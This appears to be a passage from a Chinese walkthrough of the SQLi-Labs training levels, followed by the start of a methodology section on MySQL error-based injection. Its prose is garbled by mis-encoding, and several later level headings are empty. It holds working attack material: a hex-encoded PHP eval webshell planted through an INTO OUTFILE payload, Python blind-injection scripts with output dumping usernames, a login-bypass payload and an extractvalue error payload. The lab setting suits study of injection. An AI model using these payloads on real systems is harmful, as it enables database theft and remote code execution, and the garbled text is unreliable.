æœ¬é¢˜æ— æˆåŠŸå›æ˜¾ï¼Œæ— é”™è¯¯å›æ˜¾ã€‚é€šè¿‡ç©·ä¸¾å¯çŸ¥åŒ…å«æ–¹å¼ä¸º`((''))`ï¼Œ`ORDER BY `çˆ†åˆ—æ•°ä¸º3ã€‚å°è¯•è¾“å…¥æ­£å¸¸æ•°æ®`id=1`ï¼Œå¾—åˆ°`You are in.... Use outfile......`ï¼Œæç¤ºæˆ‘ä»¬ä½¿ç”¨`outfile`è¯­å¥ã€‚

æ„é€ PHP WebShellï¼š

```
<?php @eval($_POST['shell']); ?>
```

å°†å…¶è½¬åŒ–ä¸º16è¿›åˆ¶ï¼Œåœ¨å‰é¢åŠ ä¸Šå‰å¯¼`0x`ï¼š

```
0x3c3f70687020406576616c28245f504f53545b277368656c6c275d293b203f3e
```

ä½¿ç”¨å…¨å±€å˜é‡`@@datadir`æŸ¥çœ‹MySQLå®‰è£…è·¯å¾„ï¼Œä½¿ç”¨`@@basedir`æŸ¥çœ‹æ•°æ®åº“è·¯å¾„ã€‚è¿™é‡Œæˆ‘ä»¬ç›²çŒœPHPè·¯å¾„ä¸º`/var/www/html`ï¼š

```
?id=1')) union select null,0x3c3f70687020406576616c28245f504f53545b277368656c6c275d293b203f3e,null into outfile '/var/www/html/shell.php' --+
```

### Â§1.3.8 ç¬¬8å…³ å¸ƒå°”ç›²æ³¨

æœ¬é¢˜æˆåŠŸæ— å›æ˜¾ï¼Œé”™è¯¯æ— å›æ˜¾ï¼Œç©·ä¸¾å¯çŸ¥åŒ…å«æ–¹æ³•ä¸º`''`ï¼Œ`ORDER BY`çˆ†åˆ—æ•°ä¸º3ã€‚

å‚è€ƒ[Â§3.3.1 å¸ƒå°”ç›²æ³¨ï¼ˆBoolean Basedï¼‰](#Â§3.3.1 å¸ƒå°”ç›²æ³¨ï¼ˆBoolean Basedï¼‰)ä¸€èŠ‚çš„è„šæœ¬â€”â€”

çˆ†æ•°æ®åº“åï¼š

```python
import requests

MAX_FILED_LENGTH = 20
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"

def getBinarySearchResult(url: str, paramRange: list[int], successInfo: str) -> int:
	......

databaseNameLength = getBinarySearchResult(
    URL_PREFIX + "?id=1' and length(database())>{} --+",
    [1, MAX_FILED_LENGTH],
    "You are in..........."
)
print("æ•°æ®åº“åçš„é•¿åº¦ä¸º{}ä½".format(databaseNameLength))

databaseName = ""
for i in range(1, databaseNameLength+1):
    databaseName += chr(getBinarySearchResult(
        URL_PREFIX + "?id=1' and ascii(substr((select database())," + str(i) + ",1)) > {} --+",
        [0, 128],
        "You are in..........."
    ))
    print(databaseName)
```

```shell
C:\> python writeup.py
    æ•°æ®åº“åçš„é•¿åº¦ä¸º8ä½
    s
    se
    sec
    secu
    secur
    securi
    securit
    security
```

çˆ†è¡¨åï¼š

```python
import requests

MAX_FILED_LENGTH = 40
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"


def getBinarySearchResult(url: str, paramRange: list[int], successInfo: str) -> int:
	......

databaseName = "security"
columnsName = ""
for i in range(1,MAX_FILED_LENGTH+1):
    columnsName += chr(getBinarySearchResult(
        URL_PREFIX + "?id=1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),"+str(i)+",1)) > {} --+",
        [0,127],
        "You are in..........."
    ))
    print(columnsName)
```

```shell
C:/> python writeup.py
    e
    em
    ema
	......
    emails,referers,uagents,user
    emails,referers,uagents,users
```

çˆ†åˆ—åï¼š

```python
import requests

MAX_FILED_LENGTH = 40
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"

def getBinarySearchResult(url: str, paramRange: list[int], successInfo: str) -> int:
	......

databaseName = "security"
columnsName = ""
for i in range(1,MAX_FILED_LENGTH+1):
    columnsName += chr(getBinarySearchResult(
        URL_PREFIX + "?id=1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),"+str(i)+",1)) > {} --+",
        [0,127],
        "You are in..........."
    ))
    print(columnsName)
```

```shell
C:\> python writeup.py
    i
    id
    id,
	......
    id,username,passwor
    id,username,password
```

çˆ†æ•°æ®ï¼š

```python
    ......
    columnsName += chr(getBinarySearchResult(
        URL_PREFIX + "?id=1' and ascii(substr((select group_concat(username) from security.users),"+str(i)+",1)) > {} --+",
        [0,127],
        "You are in..........."
    ))
    ......
```

```shell
C:\> python writeup.py
    D
    Du
    Dum
    ......
    Dumb,Angelina,Dummy,secure,stupid,super
    Dumb,Angelina,Dummy,secure,stupid,superm
```

### Â§1.3.9 ç¬¬9å…³ æ—¶é—´ç›²æ³¨ï¼ˆç»•è¿‡`''`ï¼‰

æœ¬é¢˜æˆåŠŸå¤±è´¥å‡æ— å›æ˜¾ï¼Œè€Œä¸”æ— æ˜æ˜¾åŒºåˆ†æ ‡å¿—ï¼Œæ•…è€ƒè™‘ä½¿ç”¨æ—¶é—´ç›²æ³¨ã€‚

> æ³¨æ„ï¼šå—åˆ¶äºç½‘ç»œç¯å¢ƒçš„é€šä¿¡è´¨é‡ï¼Œå¯èƒ½éœ€è¦å»¶é•¿`SLEEP_TIME`å‚æ•°ï¼Œå¯¼è‡´æˆ‘ä»¬ä¸å¾—ä¸å»¶é•¿ç¨‹åºçˆ†ç ´çš„æ—¶é—´ã€‚

çˆ†æ•°æ®åº“åï¼š

```python
import requests
import time

MAX_FILED_LENGTH = 40
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"
SLEEP_TIME = 0.5

def getBinarySearchResultByTime(url: str, paramRange: list[int], sleepTime: float)->int:
	......

databaseNameLength = getBinarySearchResultByTime(
    URL_PREFIX + "?id=1' and if(length(database()) > {}, sleep("+str(SLEEP_TIME)+"), 1)+ --+",
    [0,128],
    SLEEP_TIME
)
print("{}".format(databaseNameLength))

databaseName = ""
for i in range(1, databaseNameLength+1):
    databaseName += chr(getBinarySearchResultByTime(
        URL_PREFIX + "?id=1' and if(ascii(substr((select database())," + str(i) + ",1)) > {},sleep("+str(SLEEP_TIME)+"),1) --+",
        [0, 128],
        SLEEP_TIME
    ))
    print(databaseName)
```

```shell
C:\> python writeup.py
    8
    s
    se
    sec
    secu
    secur
    securi
    securit
    security
```

çˆ†è¡¨åï¼š

```python
import requests
import time

MAX_FILED_LENGTH = 40
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"
SLEEP_TIME = 0.5

def getBinarySearchResultByTime(url: str, paramRange: list[int], sleepTime: float)->int:
	......

columnsName = ""
for i in range(1, MAX_FILED_LENGTH+1):
    columnsName += chr(getBinarySearchResultByTime(
        URL_PREFIX + "?id=1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i) + ",1)) > {},sleep("+str(SLEEP_TIME)+"),1) --+",
        [0, 128],
        SLEEP_TIME
    ))
    print(columnsName)
```

```
C:\> python writeup.py
    e
    em
    ......
    emails,referers,uagents,user
    emails,referers,uagents,users
```

çˆ†åˆ—åï¼š

```python
import requests
import time

MAX_FILED_LENGTH = 40
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"
SLEEP_TIME = 0.5

def getBinarySearchResultByTime(url: str, paramRange: list[int], sleepTime: float)->int:
	......

columnsName = ""
for i in range(1, MAX_FILED_LENGTH+1):
    columnsName += chr(getBinarySearchResultByTime(
        URL_PREFIX + "?id=1' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users')," + str(i) + ",1)) > {},sleep("+str(SLEEP_TIME)+"),1) --+",
        [0, 128],
        SLEEP_TIME
    ))
    print(columnsName)
```

```shell
C:\> python writeup.py
    i
    id
    id,
    ......
    id,username,passwor
    id,username,password
```

çˆ†æ•°æ®ï¼š

```python
import requests
import time

MAX_FILED_LENGTH = 40
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"
SLEEP_TIME = 0.5

def getBinarySearchResultByTime(url: str, paramRange: list[int], sleepTime: float)->int:
	......

columnsName = ""
for i in range(1, MAX_FILED_LENGTH+1):
    columnsName += chr(getBinarySearchResultByTime(
        URL_PREFIX + "?id=1' and if(ascii(substr((select group_concat(username) from security.users)," + str(i) + ",1)) > {},sleep("+str(SLEEP_TIME)+"),1) --+",
        [0, 128],
        SLEEP_TIME
    ))
    print(columnsName)
```

```shell
C:\> python writeup.py
    D
    Du
    ......
    Dumb,Angelina,Dummy,secure,stupid,super
    Dumb,Angelina,Dummy,secure,stupid,superm
```

### Â§1.3.10 ç¬¬10å…³ æ—¶é—´ç›²æ³¨ï¼ˆç»•è¿‡`""`ï¼‰

é‡å¤ç¬¬9å…³æ­¥éª¤ï¼Œå‘ç°ä¸æˆåŠŸï¼Œè½¬è€Œç©·ä¸¾åŒ…å«æ–¹å¼ï¼Œæœ€ç»ˆç¡®å®šä¸º`""`ï¼Œå‰©ä½™æ­¥éª¤ä¸ç¬¬9å…³ç›¸åŒã€‚

### Â§1.3.11 ç¬¬11å…³ ç™»å½•ç•Œé¢é”™è¯¯æ³¨å…¥ï¼ˆç»•è¿‡`''`ï¼‰

è¯¥ç™»å½•ç•Œé¢æœ‰ä¸¤ä¸ªå‚æ•°ï¼š`passwd`ä¸`uname`ï¼Œç»å®æµ‹å‡æœ‰é”™è¯¯å›æ˜¾ï¼Œæ²¡æœ‰æ­£ç¡®å›æ˜¾ï¼ŒåŒ…å«æ–¹å¼å‡ä¸º`''`ï¼Œ`ORDER BY`çˆ†åˆ—æ•°ä¸º2ã€‚éšä¾¿é€‰ä¸€ç§é”™è¯¯æ³¨å…¥å³å¯ï¼Œå‰©ä½™æ­¥éª¤ä¸ç¬¬5å…³ç›¸åŒã€‚

### Â§1.3.12 ç¬¬12å…³ ç™»å½•ç•Œé¢é”™è¯¯æ³¨å…¥ï¼ˆç»•è¿‡`("")`ï¼‰

ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯`''`ï¼Œå‘ç°æ— æŠ¥é”™å›æ˜¾ï¼Œå°è¯•æ—¶é—´ç›²æ³¨ä¹Ÿä¸è¡Œã€‚åæ¥ä¸€çœ‹æºç æ‰çŸ¥é“åŒ…å«æ–¹å¼æ˜¯`("")`ï¼Œè€Œä¸”æœ‰æŠ¥é”™å›æ˜¾ã€‚å‰©ä¸‹æ­¥éª¤ä¸ç¬¬11å…³ç›¸åŒã€‚

### Â§1.3.13 ç¬¬13å…³ ç™»å½•ç•Œé¢æŠ¥é”™æ³¨å…¥ï¼ˆç»•è¿‡`('')`ï¼‰

ç©·ä¸¾å„ç§åŒ…å«æ–¹æ³•ï¼Œå¾—çŸ¥åŒ…å«æ–¹æ³•ä¸º`('')`ï¼Œä¸”æŠ¥é”™æœ‰å›æ˜¾ã€‚å‰©ä½™æ­¥éª¤ä¸ç¬¬5å…³ç›¸åŒã€‚

### Â§1.3.14 ç¬¬14å…³ ç™»å½•ç•Œé¢æŠ¥é”™æ³¨å…¥ï¼ˆç»•è¿‡`""`ï¼‰

ç©·ä¸¾å„ç§åŒ…å«æ–¹æ³•ï¼Œå¾—çŸ¥åŒ…å«æ–¹æ³•ä¸º`""`ï¼Œä¸”æŠ¥é”™æœ‰å›æ˜¾ã€‚å‰©ä½™æ­¥éª¤ä¸ç¬¬5å…³ç›¸åŒã€‚

### Â§1.3.15 ç¬¬15å…³ ç™»å½•ç•Œé¢ç›²æ³¨ï¼ˆç»•è¿‡`''`ï¼‰

æ­£è¯¯ç‰¹å¾æœ‰å·®åˆ«ï¼Œä½†æŠ¥é”™æ— å›æ˜¾ã€‚æ„é€ POSTçš„Payload`passwd=456' or '1'='1&uname=123' or 1=1 --+`å‘ç°ç™»å½•æˆåŠŸï¼Œè¯´æ˜åŒ…å«æ–¹å¼ä¸º`''`ã€‚æ¥ä¸‹æ¥éšä¾¿é€‰ä¸€ç§ç›²æ³¨æ–¹å¼å³å¯ã€‚

### Â§1.3.16 ç¬¬16å…³ ç™»å½•ç•Œé¢ç›²æ³¨ï¼ˆç»•è¿‡`("")`ï¼‰

ä¸ç¬¬15å…³ç±»ä¼¼ï¼Œç»è¿‡ç©·ä¸¾å¯çŸ¥åŒ…å«æ–¹å¼ä¸º`("")`ï¼Œä»¥ä¸‹ç•¥ã€‚

### Â§1.3.17 ç¬¬17å…³ é”™è¯¯æ³¨å…¥ï¼ˆä½¿ç”¨`UPDATE`ï¼‰

æ­¤é¢˜çš„éš¾ç‚¹åœ¨äºâ€œä¹ä¸€çœ‹â€æ‰€æœ‰æ“ä½œçš„å›æ˜¾éƒ½å®Œå…¨ä¸€è‡´ï¼Œå› ä¸ºæ— è®ºæ˜¯`'`/`""`è¿˜æ˜¯éšä¾¿è¾“å…¥ä¸€ä¸ªä¸å¯èƒ½å­˜åœ¨çš„è¶…é•¿ç”¨æˆ·åï¼Œè¿”å›çš„ç»“æœå‡ä¸€è‡´ã€‚ç”±æ›´æ”¹å¯†ç è¿™ä¸€åŠŸèƒ½å¯çŸ¥SQLè¯­å¥ä½¿ç”¨çš„æ˜¯`UPDATE`å­å¥ï¼Œè¯­æ³•ç±»ä¼¼äº`UPDATE è¡¨å SET åˆ—å=æ–°å¯†ç  WHERE åˆ—å=ç”¨æˆ·å`ã€‚å› æ­¤å¦‚æœæˆ‘ä»¬çœŸçš„æƒ³è®©è¿™ä¸€SQLè¯­å¥å‘æŒ¥ä½œç”¨ï¼Œæˆ‘ä»¬å°±å¿…é¡»äº‹å…ˆçŸ¥é“è¿™ä¸ªè¡¨ä¸­çš„ç”¨æˆ·åéƒ½æœ‰å“ªäº›ã€‚çŒœå¯¹ç”¨æˆ·åçš„æ¦‚ç‡å¾®ä¹å…¶å¾®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—åˆ°çš„å›æ˜¾éƒ½æ˜¯å¤±è´¥æˆ–æŠ¥é”™çš„å›æ˜¾ã€‚å¹¸å¥½è¿™é‡Œæœ‰ä¸ªå¼±ç”¨æˆ·å`admin`å¯ä»¥çŒœï¼Œä½†æ˜¯å‰©ä¸‹çš„æ€è·¯éƒ½è¡Œä¸é€šäº†ã€‚

æ— å¥ˆå®¡è®¡æºç ï¼š

```php
include("../sql-connections/sql-connect.php");
error_reporting(0);
function check_input($value){
	if(!empty($value)){
		$value = substr($value,0,15);
	}

	if (get_magic_quotes_gpc()){
		$value = stripslashes($value);
	}

	if (!ctype_digit($value)){
		$value = "'" . mysql_real_escape_string($value) . "'";
	}else{
		$value = intval($value);
	}
	return $value;
}


if(isset($_POST['uname']) && isset($_POST['passwd'])){
    $uname=check_input($_POST['uname']);  
    $passwd=$_POST['passwd'];
    @$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";
    $result=mysql_query($sql);
    $row = mysql_fetch_array($result);
    if($row){
            $row1 = $row['username'];  	
            $update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
            mysql_query($update);
            if (mysql_error()){
                print_r(mysql_error());
            }else{
                echo " You password has been successfully updated " ;		
            }
        }else{
            echo "Bug off you Silly Dumb hacker";
        }
}
```

ä»ä»¥ä¸Šæºç ä¸­æˆ‘ä»¬æ³¨æ„åˆ°ï¼š

- `$_POST['uname']`å­—æ®µè¢«è½¬ä¹‰ï¼Œæ— æ³•æ³¨å…¥
- å¿…é¡»å…ˆç¡®ä¿`SELECT username, password FROM users WHERE username= $uname LIMIT 0,1`èƒ½è¿”å›å€¼ï¼Œç„¶åæ‰èƒ½é€šè¿‡`UPDATE users SET password = '$passwd' WHERE username='$row1'`æ³¨å…¥
- æ»¡è¶³ä»¥ä¸Šä¸¤ç‚¹çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡`print_r(mysql_error())`æŠ¥é”™æ³¨å…¥

ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬å¯¹`$_POST['passwd']`å­—æ®µè¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼ŒPayloadä¸ºï¼š

```
uname=admin&passwd=admin' and extractvalue(0x0a,concat(0x0a,(SELECTè¯­å¥))) and '1'='1
```

ä»¥ä¸‹æ­¥éª¤ç•¥ã€‚

### Â§1.3.18 ç¬¬18å…³ é”™è¯¯æ³¨å…¥ï¼ˆä½¿ç”¨User-Agentï¼‰

å®¡è®¡æºç ï¼š

```php
$sql = "SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
			$result1 = mysql_query($sql);
				$row1 = mysql_fetch_array($result1);
$insert = "INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
```



### Â§1.3.19 ç¬¬19å…³

### Â§1.3.20 ç¬¬20å…³

### Â§1.3.21 ç¬¬21å…³

### Â§1.3.22 ç¬¬22å…³

### Â§1.3.23 ç¬¬23å…³

### Â§1.3.24 ç¬¬24å…³

### Â§1.3.25 ç¬¬25å…³

# Â§3 SQLæ³¨å…¥æ–¹æ³•è®º

## Â§3.1 é”™è¯¯æ³¨å…¥ï¼ˆError Basedï¼‰

> æ³¨æ„ï¼š[MySQLæºç ](https://github.com/mysql/mysql-server/blob/3e90d07c3578e4da39dc1bce73559bbdf655c28c/mysys/my_error.cc)ä¸­çš„`ERRMSGSIZE`é™åˆ¶äº†é”™è¯¯ä¿¡æ¯çš„é•¿åº¦ã€‚
>
> ```c++
> /* Max length of a error message. Should be kept in sync with MYSQL_ERRMSG_SIZE.
>  */
> #define ERRMSGSIZE (512)
> ```

### Â§3.1.1 ä¸»é”®é‡å¤æ³¨å…¥

å­æŸ¥è¯¢çš„æ ¼å¼æ˜¯`(SELECT (payload))`ï¼Œè¯¥è¯­å¥çš„ä½œç”¨ç›¸å½“äºåˆ›å»ºä¸€å¼ æ–°è¡¨ï¼Œå¯ä»¥æ ¹æ®å°†payloadè§£æä¸ºå­—æ®µåæˆ–è¡¨è¾¾å¼ï¼ŒMySQLå¯¹å…¶è®¡ç®—åè¿”å›ç›¸åº”çš„è®¡ç®—å€¼ã€‚

```sql
SELECT CONCAT((SELECT 1+1));
			+----------------------+
			| CONCAT((SELECT 1+1)) |
			+----------------------+
			| 2                    |
			+----------------------+
```

åŒç†ï¼Œæˆ‘ä»¬å¯ä»¥ç»™payloadä¼ MySQLå†…ç½®çš„å„ç±»å‡½æ•°ï¼š

```sql
SELECT CONCAT((SELECT DATABASE()));
			+-----------------------------+
			| CONCAT((SELECT DATABASE())) |
			+-----------------------------+
			| security                    |
			+-----------------------------+
SELECT CONCAT(
    	(
            SELECT GROUP_CONCAT(TABLE_NAME) 
   			FROM INFORMATION_SCHEMA.TABLES
   			WHERE TABLE_SCHEMA='security'
        )
	)
	AS something;
			+-------------------------------+
			| something                     |
			+-------------------------------+
			| emails,referers,uagents,users |
			+-------------------------------+
```

2016å¹´ï¼Œä¸€ä½ç”¨æˆ·å‘ç°å¹¶æäº¤äº†MySQLä¸­[RAND()å¼•å‘çš„è¿è¡Œæ—¶é”™è¯¯](https://bugs.mysql.com/bug.php?id=82544)ï¼Œ**åªè¦`count()`ã€`group by`/`order by`ã€`rand()`**ä¸‰è€…ä¸€èµ·ç”¨å°±æœ‰å‡ ç‡æŠ¥é”™ï¼Œå®˜æ–¹ç¡®è®¤åå°†å…¶å†™å…¥åˆ°[å®˜æ–¹æ–‡æ¡£](https://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_rand)ä¸­ï¼š

> Use of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result.
> å¦‚æœåœ¨`ORDER BY`æˆ–`GROUP BY`å­å¥ä¸­ä½¿ç”¨çš„åˆ—åå«æœ‰`RAND()`å‡½æ•°çš„è¡¨è¾¾å¼ï¼Œåˆ™å¯èƒ½ä¼šè¾“å‡ºä¸å¯é¢„æ–™çš„ç»“æœã€‚è¿™æ˜¯å› ä¸ºå¯¹äºåŒä¸€è¡Œè€Œè¨€ï¼Œæ¯ä¸ªç”±`rand()`è¡¨è¾¾å¼å¤šæ¬¡å–å€¼å¾—åˆ°çš„å­å¥éƒ½ä¼šè¿”å›ä¸åŒçš„å€¼ã€‚

å®˜æ–¹æ–‡æ¡£çš„è§£é‡Šæ¯”è¾ƒç²—ç•¥ï¼Œä¸€ç¯‡æ¥è‡ªå…ˆçŸ¥ç¤¾åŒºçš„åšæ–‡[MYSQLæŠ¥é”™æ³¨å…¥çš„ä¸€ç‚¹æ€»ç»“](https://xz.aliyun.com/t/253)çš„è§£é‡Šå¦‚ä¸‹ï¼š

> ä»¥`SELECT count(*) FROM users GROUP BY username`è¿™ä¸€SQLè¯­å¥ä¸ºä¾‹ï¼Œ`group by`å­å¥éœ€è¦æŸä¸ªè¡¨è¾¾å¼ä½œä¸ºåˆ†ç»„çš„ä¾æ®ï¼Œå¯¹æ¯ä¸€è¡Œéƒ½éœ€è¦è¿è¡Œä¸€æ¬¡è¯¥è¡¨è¾¾å¼â€”â€”å¦‚æœè¯¥è¡¨è¾¾å¼çš„å€¼æ²¡æœ‰å‡ºç°åœ¨ä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™å‘ä¸´æ—¶è¡¨ä¸­åˆ›å»ºè¿™ä¸€è¡Œâ€˜å¦‚æœå·²ç»å‡ºç°åœ¨ä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™ä»¤`count(*)`è‡ªå¢`1`ï¼š
>
> ```
> mysql> select * from users;
> +------+-----------+
> | id   | username  |
> +------+-----------+
> | 0    | jack      |
> | 1    | jack      |
> | 2    | tom       |
> +------+-----------+
> ```
>
> 1. æ‰§è¡Œ`SELECT count(*) FROM users GROUP BY username`ï¼Œé¦–å…ˆMySQLä¼šåˆ›å»ºä¸€å¼ ä¸´æ—¶è¡¨ï¼š
>
>    | `username`(ä¸»é”®) | `count(*)` |
>    | ---------------- | ---------- |
>
> 2. æ¥ç€è¯»å–`users`è¡¨çš„ç¬¬ä¸€è¡Œï¼Œæ‰§è¡Œ`username`è¡¨è¾¾å¼ï¼Œå¾—åˆ°å€¼`jack`ï¼Œå‘ç°ä¸´æ—¶è¡¨çš„ä¸»é”®ä¸­æ²¡æœ‰`jack`è¿™ä¸€é¡¹ï¼Œäºæ˜¯åˆ›å»ºä¸€è¡Œï¼š
>
>    | `username`(ä¸»é”®) | `count(*)` |
>    | :--------------: | :--------: |
>    |      `jack`      |     1      |
>
> 3. æ¥ç€è¯»å–`users`è¡¨çš„ç¬¬äºŒè¡Œï¼Œæ‰§è¡Œ`username`è¡¨è¾¾å¼ï¼Œå¾—åˆ°å€¼`jack`ï¼Œå‘ç°ä¸´æ—¶è¡¨ä¸»é”®ä¸­å·²ç»æœ‰`jack`è¿™ä¸€é¡¹äº†ï¼Œäºæ˜¯`count(*)`è‡ªå¢ï¼š
>
>    | `username`(ä¸»é”®) | `count(*)` |
>    | :--------------: | :--------: |
>    |      `jack`      |     2      |
>
> 4. æ¥ç€è¯»å–`users`è¡¨çš„ç¬¬ä¸€è¡Œï¼Œæ‰§è¡Œ`username`è¡¨è¾¾å¼ï¼Œå¾—åˆ°å€¼`tom`ï¼Œå‘ç°ä¸´æ—¶è¡¨çš„ä¸»é”®ä¸­æ²¡æœ‰`tom`è¿™ä¸€é¡¹ï¼Œäºæ˜¯åˆ›å»ºä¸€è¡Œï¼š
>
>    | `username`(ä¸»é”®) | `count(*)` |
>    | :--------------: | :--------: |
>    |      `jack`      |     2      |
>    |      `tom`       |    `1`     |
>
> ä¸Šè¿°æ­¥éª¤ååˆ†çš„æ­£å¸¸ã€‚æˆ‘ä»¬çŸ¥é“ä¸»é”®ä¸èƒ½é‡å¤ï¼Œè€Œä¸Šè¿°çš„æµç¨‹ä¿è¯äº†â€œå¦‚æœä¸»é”®å·²ç»å­˜åœ¨ï¼Œåˆ™ä¸å†åˆ›å»ºé‡å¤çš„ä¸»é”®â€ã€‚æœ‰æ²¡æœ‰ä¸€ç§æ–¹æ³•ï¼Œèƒ½æ¬ºéª—ç¨‹åºâ€œå‡è£…ä¸»é”®ä¸å­˜åœ¨ï¼Œå®é™…ä¸Šå­˜åœ¨â€å‘¢ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æƒ³è®©åŒä¸€ä¸ªè¡¨è¾¾å¼åœ¨â€œåˆ¤æ–­é˜¶æ®µâ€ä¸â€œæ·»åŠ é˜¶æ®µâ€çš„å€¼ä¸ä¸€æ ·ã€‚è¿™é‡Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°`RAND()`å‡½æ•°ã€‚
>
> æˆ‘ä»¬çŸ¥é“ï¼Œ`RAND([seed])`å‡½æ•°èƒ½éšæœºè¿”å›ä¸€ä¸ª`[0,1)`å†…çš„æµ®ç‚¹æ•°ï¼Œå¹¶æä¾›ä¸€ä¸ªå¯é€‰çš„éšæœºæ•°ç§å­å‚æ•°`seed`ã€‚ä½¿ç”¨`FLOOR()`å‡½æ•°å¯ä»¥åˆ›é€ ä¸€ä¸ªäºŒé¡¹åˆ†å¸ƒéšæœºå˜é‡ï¼š`FLOOR(RAND(0)*2)`ã€‚
>
> ```sql
> mysql> select rand(0) from users;
> +---------------------+
> | rand(0)             |
> +---------------------+
> | 0.15522042769493574 |
> |   0.620881741513388 |
> |  0.6387474552157777 |
> | 0.33109208227236947 |
> |  0.7392180764481594 |
> |  0.7028141661573334 |
> |  0.2964166321758336 |
> |  0.3736406931408129 |
> |  0.9789535999102086 |
> |  0.7738459508622493 |
> |  0.9323689853142658 |
> |  0.3403071047182261 |
> |  0.9044285983819781 |
> +---------------------+
> 13 rows in set (0.00 sec)
> 
> mysql> select rand(0),floor(rand(0)*2) from users;
> +---------------------+------------------+
> | rand(0)             | floor(rand(0)*2) |
> +---------------------+------------------+
> | 0.15522042769493574 |                0 |
> |   0.620881741513388 |                1 |
> |  0.6387474552157777 |                1 |
> | 0.33109208227236947 |                0 |
> |  0.7392180764481594 |                1 |
> |  0.7028141661573334 |                1 |
> |  0.2964166321758336 |                0 |
> |  0.3736406931408129 |                0 |
> |  0.9789535999102086 |                1 |
> |  0.7738459508622493 |                1 |
> |  0.9323689853142658 |                1 |
> |  0.3403071047182261 |                0 |
> |  0.9044285983819781 |                1 |
> +---------------------+------------------+
> 13 rows in set (0.00 sec)
> ```
>
> è¿™è¯´æ˜`floor(rand(0)*2)`è¿™ä¸ªåºåˆ—ä¸º`[0,1,1,0,1,1,......]`
>
> ç°åœ¨æˆ‘ä»¬è€ƒè™‘è¿™ä¸ªSQLè¯­å¥ï¼š`SELECT count(*) FROM users GROUP BY floor(rand(0)*2)`ï¼š
>
> 1. æ‰§è¡Œ`SELECT count(*) FROM users GROUP BY floor(rand(0)*2)`ï¼Œé¦–å…ˆMySQLä¼šåˆ›å»ºä¸€å¼ ä¸´æ—¶è¡¨ï¼š
>
>    | `floor(rand(0)*2)`(ä¸»é”®) | `count(*)` |
>    | ------------------------ | ---------- |
>
> 2. æ¥ç€è¯»å–`users`è¡¨çš„ç¬¬ä¸€è¡Œï¼Œæ‰§è¡Œ`floor(rand(0)*2)`è¡¨è¾¾å¼ï¼Œå¾—åˆ°å€¼`0`ï¼Œå‘ç°ä¸´æ—¶è¡¨çš„ä¸»é”®ä¸­æ²¡æœ‰`0`è¿™ä¸€é¡¹ï¼Œäºæ˜¯åˆ›å»ºä¸€è¡Œï¼Œæ–°å¢çš„è¿™ä¸€è¡Œçš„ä¸»é”®ä¸º`1`ï¼š
>
>    | `floor(rand(0)*2)`(ä¸»é”®) | `count(*)` |
>    | :----------------------: | :--------: |
>    |           `1`            |     1      |
>
> 3. æ¥ç€è¯»å–`users`è¡¨çš„ç¬¬äºŒè¡Œï¼Œæ‰§è¡Œ`floor(rand(0)*2)`è¡¨è¾¾å¼ï¼Œå¾—åˆ°å€¼`1`ï¼Œå‘ç°ä¸´æ—¶è¡¨ä¸»é”®ä¸­å·²ç»æœ‰`1`è¿™ä¸€é¡¹äº†ï¼Œäºæ˜¯ä¸å†å°è¯•æ–°å¢ä¸€è¡Œï¼Œä¹Ÿä¸ä¼šé‡æ–°è®¡ç®—è¡¨è¾¾å¼ï¼Œè€Œæ˜¯ç›´æ¥è®©`count(*)`è‡ªå¢ï¼š
>
>    | `floor(rand(0)*2)`(ä¸»é”®) | `count(*)` |
>    | :----------------------: | :--------: |
>    |           `1`            |     2      |
>
> 4. æ¥ç€è¯»å–`users`è¡¨çš„ç¬¬ä¸€è¡Œï¼Œæ‰§è¡Œ`floor(rand(0)*2)`è¡¨è¾¾å¼ï¼Œå¾—åˆ°å€¼`0`ï¼Œå‘ç°ä¸´æ—¶è¡¨çš„ä¸»é”®ä¸­æ²¡æœ‰`0`è¿™ä¸€é¡¹ï¼Œäºæ˜¯å°è¯•åˆ›å»ºä¸€è¡Œï¼Œé‡æ–°è®¡ç®—ä¸€éè¡¨è¾¾å¼ï¼Œå¾—åˆ°`1`ï¼Œå¹¶å°†å…¶ä½œä¸ºæ–°å¢è¡Œçš„ä¸»é”®ï¼š
>
>    | `floor(rand(0)*2)`(ä¸»é”®) | `count(*)` |
>    | :----------------------: | :--------: |
>    |           `1`            |     2      |
>    |           `1`            |     1      |
>
